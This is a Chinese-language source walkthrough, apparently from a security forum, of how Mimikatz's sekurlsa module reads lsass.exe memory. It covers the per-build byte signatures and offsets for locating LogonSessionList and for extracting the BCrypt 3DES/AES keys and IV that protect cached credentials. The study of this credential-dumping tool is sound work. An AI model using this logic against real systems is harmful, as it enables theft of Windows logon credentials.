typedef struct _KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION {
    KULL_M_MEMORY_ADDRESS DllBase;                  // 存储已加载模块的地址
    ULONG SizeOfImage;                              // 存储已加载模块的映像大小
    ULONG TimeDateStamp;
    PCUNICODE_STRING NameDontUseOutsideCallback;    // 存储已加载模块的映像名称
} KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION, *PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;
```

最后进入回调函数：

```c++
continueCallback = callBack(&amp;moduleInformation, pvArg);
```

在这里 `callBack` 是 `kuhl_m_sekurlsa_findlibs()` 函数，其定义如下。

```c++
BOOL CALLBACK kuhl_m_sekurlsa_findlibs(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
    ULONG i;
    for(i = 0; i &lt; ARRAYSIZE(lsassPackages); i++)
    {
        if(_wcsicmp(lsassPackages[i]-&gt;ModuleName, pModuleInformation-&gt;NameDontUseOutsideCallback-&gt;Buffer) == 0)
        {
            lsassPackages[i]-&gt;Module.isPresent = TRUE;
            lsassPackages[i]-&gt;Module.Informations = *pModuleInformation;
        }
    }
    return TRUE;
}
```

该函数通过将传进来的 `pModuleInformation` 中的模块名称与前文中定义的 lsass 包中需要找的进程模块进行比对，如果相同，则将 lsass 包中的 `Module.isPresent` 设为 `TRUE` 并将 `pModuleInformation` 保存到 lsass 包的 `Module.Informations` 中。

至此，成功获取 lsass.exe 进程中加载的 lsasrv.dll 模块的信息，`kull_m_process_getVeryBasicModuleInformations()` 函数调用结束。接下来，将 `cLsass` 的地址和 `kuhl_m_sekurlsa_msv_package.Module` 传入 `kuhl_m_sekurlsa_utils_search()` 函数，并在该函数中定位 `LogonSessionList` 和 `LogonSessionListCount` 这两个全局变量。

Get LogonSessionList &amp; LogonSessionListCount Global Variables
-----------------------------------------------------------------

跟进 `kuhl_m_sekurlsa_utils_search()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa\_utils.c

```c++
PLIST_ENTRY LogonSessionList = NULL;
PULONG LogonSessionListCount = NULL;

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib)
{
    PVOID *pLogonSessionListCount = (cLsass-&gt;osContext.BuildNumber &lt; KULL_M_WIN_BUILD_2K3) ? NULL : ((PVOID *) &amp;LogonSessionListCount);
    return kuhl_m_sekurlsa_utils_search_generic(cLsass, pLib, LsaSrvReferences,  ARRAYSIZE(LsaSrvReferences), (PVOID *) &amp;LogonSessionList, pLogonSessionListCount, NULL, NULL);
}
```

这里先定义了 `LIST_ENTRY` 结构的指针变量 `LogonSessionList` 以及 `PULONG` 类型的指针变量 `LogonSessionListCount`，然后将 `cLsass`、`pLib`、`LsaSrvReferences`、`ARRAYSIZE(LsaSrvReferences)` 以及 `&amp;LogonSessionList` 和 `pLogonSessionListCount` 传入 `kuhl_m_sekurlsa_utils_search_generic()` 函数。其中 `pLib` 为前面传入的 `&amp;kuhl_m_sekurlsa_msv_package.Module`。`LsaSrvReferences` 是一个包含了各种系统版本的特征码的数组，每个成员都是一个 `KULL_M_PATCH_GENERIC` 结构体，其结构如下所示。

```c++
typedef struct _KULL_M_PATCH_GENERIC {
    DWORD MinBuildNumber;
    KULL_M_PATCH_PATTERN Search;     // 包含特征码
    KULL_M_PATCH_PATTERN Patch;
    KULL_M_PATCH_OFFSETS Offsets;    // 保存 LogonSessionList 和 LogonSessionListCount 偏移量值的四个字节的偏移量
} KULL_M_PATCH_GENERIC, *PKULL_M_PATCH_GENERIC;

typedef struct _KULL_M_PATCH_PATTERN {
    DWORD Length;
    BYTE *Pattern;
} KULL_M_PATCH_PATTERN, *PKULL_M_PATCH_PATTERN;
```

Mimikatz 为 `LsaSrvReferences` 预留了常见系统版本的特征码匹配规则，如下所示。

```c++
BYTE PTRN_WIN5_LogonSessionList[]   = {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]   = {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]   = {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]   = {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]   = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[] = {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]   = {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
KULL_M_PATCH_GENERIC LsaSrvReferences[] = {
    {KULL_M_WIN_BUILD_XP,       {sizeof(PTRN_WIN5_LogonSessionList),    PTRN_WIN5_LogonSessionList},    {0, NULL}, {-4,   0}},
    {KULL_M_WIN_BUILD_2K3,      {sizeof(PTRN_WIN5_LogonSessionList),    PTRN_WIN5_LogonSessionList},    {0, NULL}, {-4, -45}},
    {KULL_M_WIN_BUILD_VISTA,    {sizeof(PTRN_WN60_LogonSessionList),    PTRN_WN60_LogonSessionList},    {0, NULL}, {21,  -4}},
    {KULL_M_WIN_BUILD_7,        {sizeof(PTRN_WN61_LogonSessionList),    PTRN_WN61_LogonSessionList},    {0, NULL}, {19,  -4}},
    {KULL_M_WIN_BUILD_8,        {sizeof(PTRN_WN6x_LogonSessionList),    PTRN_WN6x_LogonSessionList},    {0, NULL}, {16,  -4}},
    {KULL_M_WIN_BUILD_BLUE,     {sizeof(PTRN_WN63_LogonSessionList),    PTRN_WN63_LogonSessionList},    {0, NULL}, {36,  -6}},
    {KULL_M_WIN_BUILD_10_1507,  {sizeof(PTRN_WN6x_LogonSessionList),    PTRN_WN6x_LogonSessionList},    {0, NULL}, {16,  -4}},
    {KULL_M_WIN_BUILD_10_1703,  {sizeof(PTRN_WN1703_LogonSessionList),  PTRN_WN1703_LogonSessionList},  {0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_10_1803,  {sizeof(PTRN_WN1803_LogonSessionList),  PTRN_WN1803_LogonSessionList},  {0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_10_1903,  {sizeof(PTRN_WN6x_LogonSessionList),    PTRN_WN6x_LogonSessionList},    {0, NULL}, {23,  -4}},
    {KULL_M_WIN_BUILD_2022,     {sizeof(PTRN_WN11_LogonSessionList),    PTRN_WN11_LogonSessionList},    {0, NULL}, {24,  -4}},
};
```

这些特征码用于识别引用 `LogonSessionList` 和 `LogonSessionListCount` 的指令。而 `ARRAYSIZE(LsaSrvReferences)` 是 `LsaSrvReferences` 数组的大小。

跟进 `kuhl_m_sekurlsa_utils_search_generic()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa\_utils.c

```c++
BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1)
{
    KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass-&gt;hLsassMem}, aLocalMemory = {NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_SEARCH sMemory = {{{pLib-&gt;Informations.DllBase.address, cLsass-&gt;hLsassMem}, pLib-&gt;Informations.SizeOfImage}, NULL};
    PKULL_M_PATCH_GENERIC currentReference;
    #if defined(_M_X64)
        LONG offset;
    #endif
    //  根据 cLsass-&gt;osContext.BuildNumber 的版本号选择 LsaSrvReferences 中的特征码条目
    if(currentReference = kull_m_patch_getGenericFromBuild(generics, cbGenerics, cLsass-&gt;osContext.BuildNumber))
    {
        aLocalMemory.address = currentReference-&gt;Search.Pattern;
        if(kull_m_memory_search(&amp;aLocalMemory, currentReference-&gt;Search.Length, &amp;sMemory, FALSE))
        {
            aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off0; // optimize one day
            // ......
        #elif defined(_M_X64)
            aLocalMemory.address = &amp;offset;
            if(pLib-&gt;isInit = kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(LONG)))
                *genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
        #elif defined(_M_IX86)
            // ......
        #endif

            if(genericPtr1)
            {
                aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off1;
            #if defined(_M_ARM64)
                // ......
            #elif defined(_M_X64)
                aLocalMemory.address = &amp;offset;
                if(pLib-&gt;isInit = kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(LONG)))
                    *genericPtr1 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
            #elif defined(_M_IX86)
                // ......
            #endif
            }

            if(genericPtr2)
            {
                aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off2;
            #if defined(_M_ARM64)
                // ......
            #elif defined(_M_X64)
                aLocalMemory.address = &amp;offset;
                if(pLib-&gt;isInit = kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(LONG)))
                    *genericPtr2 = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
            #elif defined(_M_IX86)
                // ......
            #endif
            }
        }
    }
    return pLib-&gt;isInit;
}
```

首先，`kull_m_patch_getGenericFromBuild()` 函数根据 `cLsass-&gt;osContext.BuildNumber` 中的版本号选择 `LsaSrvReferences` 中适用于当前系统版本的特征码条目。选出来的 `currentReference-&gt;Search.Pattern` 赋给 `aLocalMemory.address` 后，将 `&amp;aLocalMemory` 连同 `&amp;sMemory` 传入 `kull_m_memory_search()` 函数。其中 `sMemory` 是一个 `KULL_M_MEMORY_SEARCH` 结构体，用于临时保存 lsasrv.dll 模块的基地址和映像大小，其声明如下。

```c++
typedef struct _KULL_M_MEMORY_SEARCH {
    KULL_M_MEMORY_RANGE kull_m_memoryRange;
    LPVOID result;
} KULL_M_MEMORY_SEARCH, *PKULL_M_MEMORY_SEARCH;

typedef struct _KULL_M_MEMORY_RANGE {
    KULL_M_MEMORY_ADDRESS kull_m_memoryAdress;
    SIZE_T size;
} KULL_M_MEMORY_RANGE, *PKULL_M_MEMORY_RANGE;

typedef struct _KULL_M_MEMORY_ADDRESS {
    LPVOID address;
    PKULL_M_MEMORY_HANDLE hMemory;
} KULL_M_MEMORY_ADDRESS, *PKULL_M_MEMORY_ADDRESS;
```

在 `kull_m_memory_search()` 函数内部定位特征码的内存地址，该函数定义如下。

```c++
BOOL kull_m_memory_search(IN PKULL_M_MEMORY_ADDRESS Pattern, IN SIZE_T Length, IN PKULL_M_MEMORY_SEARCH Search, IN BOOL bufferMeFirst)
{
    BOOL status = FALSE;
    KULL_M_MEMORY_SEARCH  sBuffer = {{{NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, Search-&gt;kull_m_memoryRange.size}, NULL};
    PBYTE CurrentPtr;
    // 定义搜索的最大地址数（搜索的极限），为保存 lsasrv.dll 模块的内存地址加上 lsasrv.dll 模块的大小
    PBYTE limite = (PBYTE) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address + Search-&gt;kull_m_memoryRange.size;

    switch(Pattern-&gt;hMemory-&gt;type)
    {
    case KULL_M_MEMORY_TYPE_OWN:
        switch(Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.hMemory-&gt;type)
        {
        case KULL_M_MEMORY_TYPE_OWN:
            // CurrentPtr 从 lsasvr.dll 的基地址开始循环，依次递增一个地址，最大地址数为 limite
            for(CurrentPtr = (PBYTE) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address; !status &amp;&amp; (CurrentPtr + Length &lt;= limite); CurrentPtr++)
                // 比较 Pattern-&gt;address 和 CurrentPtr 指向的两个内存块是否相同，如果相同则说明找到了特征码
                status = RtlEqualMemory(Pattern-&gt;address, CurrentPtr, Length);
            CurrentPtr--;
            break;
        case KULL_M_MEMORY_TYPE_PROCESS:
        case KULL_M_MEMORY_TYPE_FILE:
        case KULL_M_MEMORY_TYPE_KERNEL:
            // 为 sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address 开辟内存空间
            if(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address = LocalAlloc(LPTR, Search-&gt;kull_m_memoryRange.size))
            {
                // 将包含 lsasvr.dll 模块的那部分内存复制到 sBuffer.kull_m_memoryRange.kull_m_memoryAdress 所指向的内存中
                if(kull_m_memory_copy(&amp;sBuffer.kull_m_memoryRange.kull_m_memoryAdress, &amp;Search-&gt;kull_m_memoryRange.kull_m_memoryAdress, Search-&gt;kull_m_memoryRange.size))
                    // 再次调用 kull_m_memory_search 函数将进入到 case KULL_M_MEMORY_TYPE_OWN:
                    if(status = kull_m_memory_search(Pattern, Length, &amp;sBuffer, FALSE))
                        CurrentPtr = (PBYTE) Search-&gt;kull_m_memoryRange.kull_m_memoryAdress.address + (((PBYTE) sBuffer.result) - (PBYTE) sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
                LocalFree(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
            }
            break;
        case KULL_M_MEMORY_TYPE_PROCESS_DMP:
            // ......
        default:
            break;
        }
        break;
    default:
        break;
    }

    Search-&gt;result = status ? CurrentPtr : NULL;

    return status;
}
```

该函数首先划分出 lsasrv.dll 所属的内存空间从而确定要搜索的范围大小 `limite`，然后遍历 `limite` 范围的内存，通过 `RtlEqualMemory()` 函数匹配出与特征码相同的内存块，最终确定特征码的地址。得到的特征码地址被赋值给 `Search-&gt;result`，回到 `kuhl_m_sekurlsa_utils_search_generic()` 函数中就是 `sMemory.result`。

接着，回到 `kuhl_m_sekurlsa_utils_search_generic()` 函数中开始定位 `LogonSessionList` 变量。首先从 `currentReference` 中获取第一个偏移量加到特征码地址上，如下所示。

```c++
aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off0;
```

这里获得的是 `lea rcx` 指令中保存 `LogonSessionList` 变量偏移量的四个字节序列的地址。然后通过 `kull_m_memory_copy()` 函数获取这四个字节序列的值到 `offset` 中，此时 `offset` 中保存的是 `LogonSessionList` 变量真正的偏移量。将 `sizeof(LONG)` 和 `offset` 加到 `rip` 指向的地址上即可得到 `LogonSessionList` 变量的地址，如下所示。

```c++
aLocalMemory.address = &amp;offset;
if(pLib-&gt;isInit = kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(LONG)))
·*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
```

同理可以获得 `LogonSessionListCount` 变量的地址。

拿到 `LogonSessionList` 和 `LogonSessionListCount` 这两个变量的地址后，返回 `kuhl_m_sekurlsa_acquireLSA()` 函数，将继续调用 `lsassLocalHelper-&gt;AcquireKeys` 所指的函数。在这里是 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数，该函数用于获取加密用户凭据的密钥。

```c++
if(kuhl_m_sekurlsa_utils_search(&amp;cLsass, &amp;kuhl_m_sekurlsa_msv_package.Module))
{
    // 继续调用 kuhl_m_sekurlsa_nt6_acquireKeys 函数
    status = lsassLocalHelper-&gt;AcquireKeys(&amp;cLsass, &amp;lsassPackages[0]-&gt;Module.Informations);
    if(!NT_SUCCESS(status))
        PRINT_ERROR(L"Key import\n");
}
```

Extract BCrypt Key &amp; Vector
-------------------------------

跟进 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数：

- sekurlsa\\crypto\\kuhl\_m\_sekurlsa\_nt6.c

```c++
KIWI_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16];
// ......
NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
    NTSTATUS status = STATUS_NOT_FOUND;
    KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass-&gt;hLsassMem}, aLocalMemory = {NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule-&gt;DllBase.address, cLsass-&gt;hLsassMem}, lsassLsaSrvModule-&gt;SizeOfImage}, NULL};
#if defined(_M_X64)
    LONG offset64;
#endif
    PKULL_M_PATCH_GENERIC currentReference;
    if(currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), cLsass-&gt;osContext.BuildNumber))
    {
        aLocalMemory.address = currentReference-&gt;Search.Pattern;
        // 根据特征码获取 LsaInitializeProtectedMemory_KeyRef 的地址
        if(kull_m_memory_search(&amp;aLocalMemory, currentReference-&gt;Search.Length, &amp;sMemory, FALSE))
        {
            // 特征码的地址加上偏移量 off0 到达保存 InitializationVector 偏移量的那四个字节的地址
            aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off0;
            #if defined(_M_ARM64)
            // ......
            #elif defined(_M_X64)
            aLocalMemory.address = &amp;offset64;
            // 获取包含 InitializationVector 偏移量的那四个字节的内容，并把加到特征码的地址上，最终得到了 InitializationVector 的绝对地址
            if(kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(LONG)))
            {
                aLsassMemory.address = (PBYTE) aLsassMemory.address + sizeof(LONG) + offset64;
            #elif defined(_M_IX86)
            // ......
            #endif
                 // 全局变量 InitializationVector 中将存储初始化向量
                aLocalMemory.address = InitializationVector;   
                if(kull_m_memory_copy(&amp;aLocalMemory, &amp;aLsassMemory, sizeof(InitializationVector)))
                {
                    // 特征码的基地址加上偏移量 off1 到达保存 h3DesKey 偏移量的那四个字节的地址
                    aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off1;
                    if(kuhl_m_sekurlsa_nt6_acquireKey(&amp;aLsassMemory, &amp;cLsass-&gt;osContext, &amp;k3Des, 
                        #if defined(_M_ARM64)
                        currentReference-&gt;Offsets.armOff1
                        #else
                        0
                        #endif
                        ))
                    {
                        aLsassMemory.address = (PBYTE) sMemory.result + currentReference-&gt;Offsets.off2;
                        if(kuhl_m_sekurlsa_nt6_acquireKey(&amp;aLsassMemory, &amp;cLsass-&gt;osContext, &amp;kAes,
                            #if defined(_M_ARM64)
                            currentReference-&gt;Offsets.armOff2
                            #else
                            0
                            #endif
                            ))
                            status = STATUS_SUCCESS;
                    }
                }
            }
        }
    }
    return status;
}
```

首先，同样是通过 `kull_m_patch_getGenericFromBuild()` 函数选出适用于当前系统版本的 `PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef` 中的特征码条目。类似于前文中使用的 `LsaSrvReferences`，`PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef` 也是一个包含了各种系统版本的特征码的数组，但主要用来定位加密用户凭据的初始化向量和密钥，数组中每个成员都是一个 `KULL_M_PATCH_GENERIC` 结构体。

在 Windows 系统中，用户的登录凭据由 `LsaProtectMemory()` 函数调用后在内存中加密缓存，逆向分析可以发现该函数实际上调用了 `LsaEncryptMemory()` 函数，如下图所示。

![image-20221218000404095](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-642dd290c4494aa502dcf1ce0b4e06f67560f52f.png)

而 `LsaEncryptMemory()` 函数实际上封装了 `BCryptEncrypt()` 和 `BCryptDecrypt()` 函数，如下图所示，其中 `h3DesKey`、`hAesKey` 是加密用到的密钥对象的句柄，`InitializationVector` 是初始化向量。

![image-20221218000322792](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-e0031fc6d640be168c6cfbb5253a6434462b1a14.png)

`BCryptEncrypt()` 和 `BCryptDecrypt()` 是 [CNG](https://learn.microsoft.com/zh-cn/windows/win32/seccng/cng-portal)（Cryptography Next Generation）中的加密基元函数。CNG 即下一代加密技术，是 CryptoAPI 的替代物，其中提供了一套 API，可用来执行诸如创建、存储和检索加密密钥等基本的加密操作。

值得注意的是，在 `LsaEncryptMemory()` 函数种会根据待加密的数据块长度来选择对称加密算法，如果输入的缓冲区长度能被 8 整除，则会使用 AES 算法，否则就使用 3Des。此外 `LsaEncryptMemory()` 函数还提供了解密功能，为了解密用户凭据，我们需要获取初始化向量和密钥，但它们存储在哪？

我们分析发现有一个 `LsaInitializeProtectedMemory()` 函数对 `h3DesKey` 和 `hAesKey` 初始化，如下图所示。先由 `BCryptOpenAlgorithmProvider()` 函数加载并初始化 CNG 提供程序，并将初始化的句柄赋给 `h3DesProvider` 和 `h3AesProvider`。然后使用 `BCryptSetProperty()` 函数设置 CNG 对象的命名属性的值。

![image-20221230120956613](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-34a6b4415e5150dca390a2711c5ef90c20f04f37.png)

继续往下可以看到，系统会使用 `BCryptGenRandom()` 函数为密钥缓冲区生成随机数，这意味着每次 lsass.exe 启动时都会生成随机的新密钥。最后由 `BCryptGenerateSymmetricKey()` 函数根据随机生成的密钥缓冲区创建密钥对象，并将句柄赋给 `h3DesKey` 和 `hAesKey`，此句柄用于需要密钥的后续函数，例如 `BCryptEncrypt()` 等。

由于这个两个句柄以及 `InitializationVector` 都是全局变量，因此可以使用 `rip` 相对寻址来定位他们的地址，跟前文中定位那两个全局变量的方法是一样的。获取到句柄后，再根据句柄与指针的关系获取到真正的密钥内容。

Mimikatz 为 `PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef` 预留了常见系统版本的特征码匹配规则，用来匹配引用 `InitializationVector`，`h3DesKey` 和 `hAesKey` 的指令，如下所示。

```c++
BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[]   = {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d};
BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[]   = {0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d};
BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[]   = {0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15};
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
    {KULL_M_WIN_BUILD_VISTA,    {sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),    PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
    {KULL_M_WIN_BUILD_7,        {sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY),    PTRN_WNO8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
    {KULL_M_WIN_BUILD_8,        {sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY),    PTRN_WIN8_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
    {KULL_M_WIN_BUILD_10_1507,  {sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),    PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
    {KULL_M_WIN_BUILD_10_1809,  {sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY),    PTRN_WN10_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
};
```

以 Windows 10 x64 1903 系统为例，Mimikatz 扫描下图红色边框标出的特征码，以识别 `lea rdx, ?h3DesKey`、`lea rdx, ?hAesKey` 和 `lea rdx, ?InitializationVector` 指令。在 x86\_64 架构上，这些指令使用 `rip` 相对寻址来访问和使用全局变量，下图中的蓝色、绿色和黄色边框标出的字节序列，即为指令所保存的 `h3DesKey`、`hAesKey` 和 `InitializationVector` 相对于当前指令的偏移量（小端序）。

![image-20221218121056722](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-2f6c3590d9084e3d9f4b84820e9cc37d578f55d9.png)

分别取出这四个字节中保存的偏移量值，加到 `rip` 指向的地址上即可分别得到 `h3DesKey`、`hAesKey` 和 `InitializationVector` 的地址，如下图所示。可以看到 `h3DesKey` 和 `hAesKey` 都是 `BCRYPT_KEY_HANDLE` 结构体。

![image-20221218121205349](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0d8a19557d651c9cc84af07d0cf03f50738f7fe7.png)

在 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数中，先通过与 `kuhl_m_sekurlsa_utils_search_generic()` 函数类似的逻辑获取 `InitializationVector` 的地址，然后调用两次 `kuhl_m_sekurlsa_nt6_acquireKey()` 函数定位 `h3DesKey` 和 `hAesKey` 的地址。

跟进 `kuhl_m_sekurlsa_nt6_acquireKey()` 函数：

- sekurlsa\\crypto\\kuhl\_m\_sekurlsa\_nt6.c

```c++
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
{
    BOOL status = FALSE;
    KULL_M_MEMORY_ADDRESS aLocalMemory = {&amp;aLsassMemory-&gt;address, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
    PVOID buffer; SIZE_T taille; LONG offset;
    // 根据 BuildNumber 中的系统版本，在几种 KIWI_BCRYPT_KEY 结构中选择适合的版本
    if(pOs-&gt;BuildNumber &lt; KULL_M_WIN_MIN_BUILD_8)
    {
        taille = sizeof(KIWI_BCRYPT_KEY);
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
    }
    else if(pOs-&gt;BuildNumber &lt; KULL_M_WIN_MIN_BUILD_BLUE)
    {
        taille = sizeof(KIWI_BCRYPT_KEY8);
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
    }
    else
    {
        // taille 为 KIWI_BCRYPT_KEY81 结构体的大小
        taille = sizeof(KIWI_BCRYPT_KEY81);
        // offset 为 hardkey 属性在 KIWI_BCRYPT_KEY81 结构体中的偏移
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
    }

    if(buffer = LocalAlloc(LPTR, taille))
    {
    #if defined(_M_ARM64)
        // ......
    #elif defined(_M_X64)
        LONG offset64;
        aLocalMemory.address = &amp;offset64;
        // 获取保存 h3DesKey 偏移量的那四个字节的值，并加到 rip 指令的地址上，最终得到了 h3DesKey 变量的地址
        if(kull_m_memory_copy(&amp;aLocalMemory, aLsassMemory, sizeof(LONG)))
        {
            aLsassMemory-&gt;address = (PBYTE) aLsassMemory-&gt;address + sizeof(LONG) + offset64;
            aLocalMemory.address = &amp;aLsassMemory-&gt;address;
    #elif defined(_M_IX86)
        // ......
    #endif
            // 将 BCRYPT_KEY_HANDLE 结构的 h3DesKey 变量复制到 hKey 指向的内存中
            if(kull_m_memory_copy(&amp;aLocalMemory, aLsassMemory, sizeof(PVOID)))
            {
                aLocalMemory.address = &amp;hKey;
                if(kull_m_memory_copy(&amp;aLocalMemory, aLsassMemory, sizeof(KIWI_BCRYPT_HANDLE_KEY)) &amp;&amp; hKey.tag == 'UUUR')
                {
                    // 将 KIWI_BCRYPT_HANDLE_KEY::key，也就是 KIWI_BCRYPT_KEY81 结构复制到 buffer 指向的内存中
                    aLocalMemory.address = buffer; aLsassMemory-&gt;address = hKey.key;
                    if(kull_m_memory_copy(&amp;aLocalMemory, aLsassMemory, taille) &amp;&amp; ((PKIWI_BCRYPT_KEY) buffer)-&gt;tag == 'MSSK') // same as 8
                    {
                        // buffer 加上 offset 到达 KIWI_BCRYPT_KEY::hardkey 的地址
                        pHardKey = (PKIWI_HARD_KEY) ((PBYTE) buffer + offset);
                        // 将 KIWI_HARD_KEY::data 复制到 aLocalMemory.address 指向的内存中
                        if(aLocalMemory.address = LocalAlloc(LPTR, pHardKey-&gt;cbSecret))
                        {
                            aLsassMemory-&gt;address = (PBYTE) hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
                            if(kull_m_memory_copy(&amp;aLocalMemory, aLsassMemory, pHardKey-&gt;cbSecret))
                            {
                                __try
                                {
                                    // 通过 BCryptGenerateSymmetricKey 函数创建一个密钥对象
                                    status = NT_SUCCESS(BCryptGenerateSymmetricKey(pGenKey-&gt;hProvider, &amp;pGenKey-&gt;hKey, pGenKey-&gt;pKey, pGenKey-&gt;cbKey, (PUCHAR) aLocalMemory.address, pHardKey-&gt;cbSecret, 0));
                                }
                                __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
                            }
                            LocalFree(aLocalMemory.address);
                        }
                    }
                }
            }
        }
        LocalFree(buffer);
    }
    return status;
}
```

